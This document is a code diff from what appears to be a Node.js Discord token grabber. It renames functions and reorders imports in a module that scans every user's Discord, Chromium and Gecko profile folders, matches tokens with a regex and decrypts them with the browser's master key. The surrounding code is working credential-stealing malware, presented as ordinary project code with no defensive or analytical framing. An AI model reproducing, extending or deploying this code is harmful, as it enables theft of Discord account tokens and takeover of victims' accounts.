@@ -3,10 +3,9 @@ const fs = require('fs/promises');
 const glob = require('glob');
 
 const browsersPaths = require("./../browsers/paths.js");
+const browsersProfiles = require("./../browsers/profiles.js");
 
 const hardware = require("./../../utils/hardware/hardware.js");
-
-const browsersProfiles = require("./../browsers/profiles.js");
 
 const tokens = [];
 
@@ -16,11 +15,11 @@ const RegexpBrowsers = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/
 const c = require("./../browsers/chromium.js");
 const chromium = new c.Chromium();
 
-const getTokens = async () => {
-    const users = await hardware.getUsers();
+const GetTokens = async () => {
+    const users = await hardware.GetUsers();
 
     for (const user of users) {
-        const discordPaths = browsersPaths.getDiscordPaths();
+        const discordPaths = browsersPaths.GetDiscordPaths();
         for (const [name, discordPath] of Object.entries(discordPaths)) {
             const fullPath = path.join(user, 'AppData', 'Roaming', discordPath);
 
@@ -60,7 +59,7 @@ const getTokens = async () => {
                                 for (const match of matches) {
                                     const encodedPass = match.split('dQw4w9WgXcQ:')[1];
                                     const decodedPass = Buffer.from(encodedPass, 'base64');
-                                    const token = chromium.decrypt(decodedPass, masterKey);
+                                    const token = chromium.Decrypt(decodedPass, masterKey);
 
                                     if (!tokens.some(t => t.token === token)) {
                                         tokens.push({
@@ -75,9 +74,9 @@ const getTokens = async () => {
                 }
             } catch (err) {
             }
-        }
+        };
 
-        const chromiumBrowsers = browsersPaths.getChromiumBrowsers();
+        const chromiumBrowsers = browsersPaths.GetChromiumBrowsers();
         for (const [name, browserPath] of Object.entries(chromiumBrowsers)) {
             const fullPath = path.join(user, browserPath);
 
@@ -91,7 +90,7 @@ const getTokens = async () => {
                     continue;
                 };
 
-                const profilePaths = browsersProfiles.getChromiumProfiles(fullPath, name);
+                const profilePaths = browsersProfiles.GetChromiumProfiles(fullPath, name);
 
                 if (profilePaths.length === 0) {
                     continue;
@@ -139,9 +138,9 @@ const getTokens = async () => {
                 }
             } catch (err) {
             }
-        }
+        };
 
-        const geckoBrowsers = browsersPaths.getGeckoBrowsers();
+        const geckoBrowsers = browsersPaths.GetGeckoBrowsers();
         for (const [name, browserPath] of Object.entries(geckoBrowsers)) {
             const fullPath = path.join(user, browserPath);
 
@@ -155,7 +154,7 @@ const getTokens = async () => {
                     continue;
                 }
 
-                const profilePaths = browsersProfiles.getGeckoProfiles(fullPath, name);
+                const profilePaths = browsersProfiles.GetGeckoProfiles(fullPath, name);
 
                 if (profilePaths.length === 0) {
                     continue;
@@ -202,11 +201,11 @@ const getTokens = async () => {
             } catch (err) {
             }
         }
-    }
+    };
 
     return tokens;
-}
+};
 
 module.exports = {
-    getTokens
-}
+    GetTokens
+};
